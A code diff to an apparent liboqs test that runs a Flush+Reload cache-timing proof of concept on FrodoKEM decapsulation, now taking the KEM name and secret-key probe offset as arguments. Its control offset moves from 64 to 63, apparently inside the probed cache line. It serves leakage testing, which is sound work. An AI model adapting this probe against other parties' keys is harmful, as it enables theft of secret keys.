@@ -11,9 +11,9 @@
  *
  * Method:
  *   1. raw cycle comparison (no hit/miss thresholding)
- *   2. good ct vs bad ct: compare probe(sk[0]) trimmed mean
- *   3. sk[64] as control line (not touched by cmovs+movups)
- *      -> if sk[0] shows diff but sk[64] does not, the signal
+ *   2. good ct vs bad ct: compare probe(sk[probe_loc]) trimmed mean
+ *   3. sk[ctrl_loc] as control line (not touched by cmovs+movups)
+ *      -> if sk[probe_loc] shows diff but sk[ctrl_loc] does not, the signal
  *        is specific to the conditional load, not overall noise
  *   4. 30 rounds x 3000 samples, trimmed mean (drop top/bottom 10%)
  *
@@ -25,7 +25,7 @@
  *     -DCMAKE_C_COMPILER="/path/to/clang" \
  *     ..
  * ninja
- * sudo ./tests/kem_fo_cache_oracle
+ * sudo ./tests/kem_fo_cache_oracle FrodoKEM-640-AES 0
  *
  * Notes:
  * - sudo may or may not be necessary
@@ -43,6 +43,12 @@
 
 #define SAMPLES_PER_ROUND 3000
 #define NUM_ROUNDS 30
+
+#define ARGS_HELP_TEXT                                                         \
+    "Usage: %s <kem_name> <probe_loc>\n"                                       \
+    "Arguments:\n"                                                             \
+    "    kem_name: FrodoKEM-640-AES\n"                                         \
+    "    probe_loc: 0\n"
 
 static inline uint64_t rdtsc(void) {
     uint32_t lo, hi;
@@ -126,7 +132,8 @@ typedef struct {
 } round_result_t;
 
 static void run_round(OQS_KEM *kem, uint8_t *sk, uint8_t *ct, uint8_t *ct_bad,
-                      uint8_t *ss2, uint32_t *rng, round_result_t *res) {
+                      uint8_t *ss2, uint32_t *rng, round_result_t *res,
+                      size_t probe_loc, size_t ctrl_loc) {
     uint64_t *vg = malloc(SAMPLES_PER_ROUND * sizeof(uint64_t));
     uint64_t *vb = malloc(SAMPLES_PER_ROUND * sizeof(uint64_t));
     uint64_t *cg = malloc(SAMPLES_PER_ROUND * sizeof(uint64_t));
@@ -144,8 +151,8 @@ static void run_round(OQS_KEM *kem, uint8_t *sk, uint8_t *ct, uint8_t *ct_bad,
 
         uint8_t *tct = use_bad ? ct_bad : ct;
 
-        clflush(&sk[0]);
-        clflush(&sk[64]);
+        clflush(&sk[probe_loc]);
+        clflush(&sk[ctrl_loc]);
         mfence();
         lfence();
 
@@ -153,8 +160,8 @@ static void run_round(OQS_KEM *kem, uint8_t *sk, uint8_t *ct, uint8_t *ct_bad,
 
         mfence();
         lfence();
-        uint64_t t0 = probe(&sk[0]);
-        uint64_t t1 = probe(&sk[64]);
+        uint64_t t0 = probe(&sk[probe_loc]);
+        uint64_t t1 = probe(&sk[ctrl_loc]);
 
         if (use_bad) {
             vb[nb] = t0;
@@ -201,17 +208,62 @@ static void print_aggregate(const char *label, double *diffs, int n) {
            diffs[n / 2], sum / n, diffs[n / 4], diffs[n * 3 / 4], pos, n);
 }
 
-int main() {
-    setup_realtime(0);
+struct Args {
+    const char *kem_name;
+    size_t probe_loc;
+    size_t ctrl_loc;
+};
 
-    OQS_KEM *kem = OQS_KEM_new(OQS_KEM_alg_frodokem_640_aes);
-    if (!kem) {
-        fprintf(stderr, "KEM init failed\n");
-        return 1;
+static void args_init(struct Args *args) {
+    args->kem_name = NULL;
+    args->ctrl_loc = 63;
+}
+
+/* Expected usage:
+ * kem_fo_cache_oracle <kem_name> <probe_loc>
+ */
+static int args_parse(int argc, char *argv[], struct Args *args) {
+    if (argc != 3) {
+        fprintf(stderr, ARGS_HELP_TEXT, argv[0]);
+        return -1;
     }
 
-    printf("\nFrodoKEM-640-AES Flush+Reload PoC\n");
-    printf("  Probes: sk[0] (target) + sk[64] (control)\n");
+    args->kem_name = argv[1];
+    args->probe_loc = (size_t)strtoull(argv[2], NULL, 10);
+    return 0;
+}
+
+int main(int argc, char *argv[]) {
+    struct Args args;
+    args_init(&args);
+    if (args_parse(argc, argv, &args) < 0) {
+        exit(EXIT_FAILURE);
+    }
+    char probelabel[16], ctrllabel[16], probelabel_good[24], probelabel_bad[24],
+        ctrllabel_good[24], ctrllabel_bad[24];
+    snprintf(probelabel, sizeof(probelabel), "sk[%lu]", args.probe_loc);
+    snprintf(ctrllabel, sizeof(ctrllabel), "sk[%lu]", args.ctrl_loc);
+    snprintf(probelabel_good, sizeof(probelabel_good), "%s G.CT", probelabel);
+    snprintf(probelabel_bad, sizeof(probelabel_bad), "%s B.CT", probelabel);
+    snprintf(ctrllabel_good, sizeof(ctrllabel_good), "%s G.CT", ctrllabel);
+    snprintf(ctrllabel_bad, sizeof(ctrllabel_bad), "%s B.CT", ctrllabel);
+
+    setup_realtime(0);
+
+    OQS_KEM *kem = OQS_KEM_new(args.kem_name);
+    if (!kem) {
+        fprintf(stderr, "%s init failed\n", args.kem_name);
+        exit(EXIT_FAILURE);
+    }
+    if (args.probe_loc >= kem->length_secret_key) {
+        fprintf(stderr, "probe offset %lu is off limit %lu\n", args.probe_loc,
+                kem->length_secret_key);
+        OQS_KEM_free(kem);
+        exit(EXIT_FAILURE);
+    }
+
+    printf("\n%s Flush+Reload PoC\n", args.kem_name);
+    printf("  Probes: %s (target) + %s (control)\n", probelabel, ctrllabel);
     printf("  Rounds=%d  Samples/round=%d\n", NUM_ROUNDS, SAMPLES_PER_ROUND);
 
     uint8_t *pk = malloc(kem->length_public_key);
@@ -293,11 +345,12 @@ int main() {
     uint32_t rng = 42;
 
     printf("\n=== Per-round statistics (cycles, trimmed mean) ===\n");
-    printf("%4s | %18s | %18s | %18s | %18s\n", "R", "sk[0] G.tm", "sk[0] B.tm",
-           "sk[64] G.tm", "sk[64] B.tm");
+    printf("%4s | %18s | %18s | %18s | %18s\n", "R", probelabel_good,
+           probelabel_bad, ctrllabel_good, ctrllabel_bad);
 
     for (int r = 0; r < NUM_ROUNDS; r++) {
-        run_round(kem, sk, ct, ct_bad, ss2, &rng, &R[r]);
+        run_round(kem, sk, ct, ct_bad, ss2, &rng, &R[r], args.probe_loc,
+                  args.ctrl_loc);
         printf("  %02d | %14.1f     | %14.1f     | %14.1f     | %14.1f\n",
                r + 1, R[r].good_tmean, R[r].bad_tmean, R[r].ctrl_good_tmean,
                R[r].ctrl_bad_tmean);
@@ -313,8 +366,8 @@ int main() {
            "colder for good) ===\n");
     printf("%-10s | %8s | %8s | %8s | %8s | positive\n", "Probe", "Median",
            "Mean", "Q1", "Q3");
-    print_aggregate("sk[0]", diff_tmean_0, NUM_ROUNDS);
-    print_aggregate("sk[64]", diff_tmean_ctrl, NUM_ROUNDS);
+    print_aggregate(probelabel, diff_tmean_0, NUM_ROUNDS);
+    print_aggregate(ctrllabel, diff_tmean_ctrl, NUM_ROUNDS);
 
     double *d0 = malloc(NUM_ROUNDS * sizeof(double));
     double *dc = malloc(NUM_ROUNDS * sizeof(double));
@@ -332,23 +385,24 @@ int main() {
     }
 
     printf("\n=== Verdict ===\n");
-    printf("sk[0]  (cmovs target):  median diff = %+.1f  positive = %d/%d\n",
-           d0[NUM_ROUNDS / 2], pos_0, NUM_ROUNDS);
-    printf("sk[64] (control line):  median diff = %+.1f  positive = %d/%d\n",
-           dc[NUM_ROUNDS / 2], pos_c, NUM_ROUNDS);
+    printf("%s  (cmovs target):  median diff = %+.1f  positive = %d/%d\n",
+           probelabel, d0[NUM_ROUNDS / 2], pos_0, NUM_ROUNDS);
+    printf("%s (control line):  median diff = %+.1f  positive = %d/%d\n",
+           ctrllabel, dc[NUM_ROUNDS / 2], pos_c, NUM_ROUNDS);
 
     if (d0[NUM_ROUNDS / 2] > 1.0 && pos_0 > NUM_ROUNDS * 2 / 3) {
-        printf("\nsk[0]: SECRET-DEPENDENT cache residency change detected\n");
+        printf("\n%s: SECRET-DEPENDENT cache residency change detected\n",
+               probelabel);
         printf("  %d/%d rounds show consistent direction\n", pos_0, NUM_ROUNDS);
         if (pos_c <= NUM_ROUNDS * 2 / 3) {
-            printf("sk[64]: No consistent direction (%d/%d)\n", pos_c,
+            printf("%s: No consistent direction (%d/%d)\n", ctrllabel, pos_c,
                    NUM_ROUNDS);
             printf("  -> Signal is specific to the conditional load target, "
                    "not overall noise\n");
         }
     } else {
-        printf("\nNo significant difference at sk[0] (med=%.1f, pos=%d/%d)\n",
-               d0[NUM_ROUNDS / 2], pos_0, NUM_ROUNDS);
+        printf("\nNo significant difference at %s (med=%.1f, pos=%d/%d)\n",
+               probelabel, d0[NUM_ROUNDS / 2], pos_0, NUM_ROUNDS);
     }
 
     free(d0);
